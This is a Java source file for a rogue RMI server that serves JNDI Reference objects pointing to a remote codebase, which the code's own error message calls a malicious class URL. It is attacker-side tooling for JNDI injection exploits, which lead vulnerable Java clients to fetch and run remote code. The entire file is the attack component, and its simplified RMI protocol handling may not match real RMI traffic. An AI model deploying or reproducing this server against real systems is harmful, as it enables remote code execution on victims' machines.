package com.minshenyao;

import java.io.*;
import java.net.MalformedURLException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.naming.Reference;
import javax.net.ServerSocketFactory;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RmiService {
    private static final Logger LOGGER = Logger.getLogger(RmiService.class.getName());
    private static RmiService rmiServiceInstance;
    private final int port;
    private final URL classpathUrl;
    private ServerSocket serverSocket;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private Thread serviceThread;

    private RmiService(int port, URL classpathUrl) throws IOException {
        this.port = port;
        this.classpathUrl = classpathUrl;
        this.serverSocket = ServerSocketFactory.getDefault().createServerSocket(port);
    }

    public void start() {
        if (running.compareAndSet(false, true)) {
            serviceThread = new Thread(this::runService);
            serviceThread.setDaemon(true);
            serviceThread.start();
        } else {
            LOGGER.warning("RMI 服务已在运行");
        }
    }

    private void runService() {
        LOGGER.info("RMI 服务已启动，监听在 0.0.0.0: " + port);
        try {
            while (running.get() && !serverSocket.isClosed()) {
                try {
                    Socket socket = serverSocket.accept();
                    handleConnection(socket);
                } catch (IOException e) {
                    if (running.get()) {
                        LOGGER.log(Level.WARNING, "接受连接时出错", e);
                    }
                }
            }
        } finally {
            closeServerSocket();
        }
    }

    private void handleConnection(Socket socket) {
        try {
            LOGGER.info("连接来源: " + socket.getRemoteSocketAddress());
            try (
                    InputStream inputStream = socket.getInputStream();
                    DataInputStream dataInputStream = new DataInputStream(inputStream);
                    OutputStream outputStream = socket.getOutputStream();
                    DataOutputStream dataOutputStream = new DataOutputStream(outputStream)
            ) {
                // Read the RMI request
                int operation = dataInputStream.read();
                if (operation == 0) { // RMI lookup
                    handleRmiLookup(dataInputStream, dataOutputStream);
                } else {
                    LOGGER.warning("不支持的操作: " + operation);
                }
            }
        } catch (Exception e) {
            LOGGER.log(Level.WARNING, "错误处理连接", e);
        } finally {
            try {
                socket.close();
            } catch (IOException e) {
                LOGGER.log(Level.WARNING, "关闭套接字时出错", e);
            }
        }
    }

    private void handleRmiLookup(DataInputStream in, DataOutputStream out) throws Exception {
        String objectName = in.readUTF();
        LOGGER.info("执行 RMI 查找: " + objectName);

        out.writeByte(0); // Acknowledge the request
        try (ObjectOutputStream objectOutputStream = new ObjectOutputStream(out)) {
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(new Reference("Foo", classpathUrl.getRef(), classpathUrl.toString()));
            objectOutputStream.writeObject(referenceWrapper);
            objectOutputStream.flush();
        }
    }

    public void stop() {
        if (running.compareAndSet(true, false)) {
            closeServerSocket();
            if (serviceThread != null) {
                serviceThread.interrupt();
                try {
                    serviceThread.join(5000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
                serviceThread = null;
            }
            LOGGER.info("RMI 服务已停止");
        }
    }

    private void closeServerSocket() {
        if (serverSocket != null && !serverSocket.isClosed()) {
            try {
                serverSocket.close();
            } catch (IOException e) {
                LOGGER.log(Level.WARNING, "关闭服务器套接字时出错", e);
            }
        }
    }

    public static synchronized void startRmiService(URL codebaseUrl, int port) {
        try {
            if (rmiServiceInstance != null) {
                stopRmiService();
            }
            rmiServiceInstance = new RmiService(port, codebaseUrl);
            rmiServiceInstance.start();
        } catch (Exception e) {
            LOGGER.log(Level.SEVERE, "无法启动 RMI 服务", e);
            throw new RuntimeException("无法启动 RMI 服务", e);
        }
    }

    public static synchronized void startRmiService(String codebaseUrl, int port) {
        try {
            startRmiService(new URL(codebaseUrl), port);
        } catch (MalformedURLException e) {
            LOGGER.log(Level.SEVERE, "无效的恶意类 URL", e);
            throw new RuntimeException("无效的恶意类 URL: " + codebaseUrl, e);
        }
    }

    public static synchronized void stopRmiService() {
        if (rmiServiceInstance != null) {
            rmiServiceInstance.stop();
            rmiServiceInstance = null;
        }
    }
}